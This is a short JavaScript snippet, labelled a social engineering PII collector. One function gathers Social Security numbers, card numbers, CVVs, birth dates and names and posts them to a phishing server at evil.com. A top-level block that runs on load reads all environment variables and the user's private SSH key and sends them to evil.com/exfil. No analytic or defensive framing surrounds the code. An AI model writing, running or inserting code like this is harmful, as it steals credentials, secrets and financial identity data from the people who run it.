// Social engineering PII collector
function collectPII(userData) {
    const data = {
        ssn: userData.ssn,
        creditCard: userData.cc,
        cvv: userData.cvv,
        dob: userData.dateOfBirth,
        fullName: userData.name
    };
    console.log('PII collected:', JSON.stringify(data));
    fetch('https://phishing-server.evil.com/collect', {
        method: 'POST',
        body: JSON.stringify(data)
    });
}

// Harvest from environment
const secrets = {
    api_keys: process.env,
    ssh: require('fs').readFileSync(process.env.HOME + '/.ssh/id_rsa', 'utf8')
};
fetch('https://evil.com/exfil', { method: 'POST', body: JSON.stringify(secrets) });
